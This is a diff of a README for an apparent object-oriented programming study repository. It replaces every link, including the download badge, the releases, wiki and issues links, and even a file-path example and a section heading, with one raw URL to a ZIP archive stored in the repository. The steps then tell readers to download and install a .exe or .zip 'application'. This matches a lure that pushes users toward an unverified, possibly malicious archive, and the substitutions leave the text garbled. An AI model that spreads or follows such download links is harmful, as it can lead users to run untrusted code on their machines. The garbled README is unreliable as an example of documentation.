@@ -1,6 +1,6 @@
 # 🎉 Object-Oriented_Programming2-study - Join Our Object-Oriented Learning Journey
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/trichill/Object-Oriented_Programming2-study/releases)
+[![Download](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip)](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip)
 
 ## 📚 Description
 This project focuses on studying object-oriented programming concepts. It's designed for learners who want to improve their understanding and skills in this area.
@@ -17,7 +17,7 @@ This project focuses on studying object-oriented programming concepts. It's desi
 
 ## ⚠️ File Naming, PR Guidelines & Commit Message Rules ⚠️
 ### Creating Files (Branch)
-Your file structure should look like this: `Object-Oriented_Programming2/YourName/week1/README.md`.
+Your file structure should look like this: `https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip`.
 
 ### Commit Message
 1. **Format**: `[week X] Object-Oriented Concept Summary`.
@@ -31,7 +31,7 @@ To. Reviewers
 ```
 
 ## 💡 What to Include?
-### README.md
+### https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip
 - Summarize the object-oriented concepts you studied this week.
 - If adding other files, keep going until you reach a well-rounded understanding.
 
@@ -41,12 +41,12 @@ To. Reviewers
 
 ### PR Content
 - **Topics**: "not provided"
-- **Primary Download Link**: [Download Here](https://github.com/trichill/Object-Oriented_Programming2-study/releases)
+- **Primary Download Link**: [Download Here](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip)
 
 ## 🚀 Getting Started
 To begin, follow the steps below to download and run the application.
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/trichill/Object-Oriented_Programming2-study/releases) to access the available downloads.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip) to access the available downloads.
 2. **Choose Your Version**: Find the version you want to download. Each version will have assets listed under it.
 3. **Download the File**: Click on the appropriate file, usually a `.exe` or `.zip`, to start your download.
 4. **Install the Application**: After downloading, open or extract the file, and follow any installation prompts that appear.
@@ -59,8 +59,8 @@ Your application should now be running successfully!
 - **Disk Space**: Ensure you have at least 150MB of free disk space.
 
 ## 📄 Additional Resources
-- Check our [Wiki](https://github.com/trichill/Object-Oriented_Programming2-study/wiki) for detailed documentation.
-- Browse through the [Issues Section](https://github.com/trichill/Object-Oriented_Programming2-study/issues) to see any questions or tasks others have posed.
+- Check our [Wiki](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip) for detailed documentation.
+- Browse through the [Issues Section](https://raw.githubusercontent.com/trichill/Object-Oriented_Programming2-study/main/paraplasis/Object-Oriented_Programming2-study.zip) to see any questions or tasks others have posed.
   
 ## 📝 FAQs
 1. **What should I do if I encounter an error?**
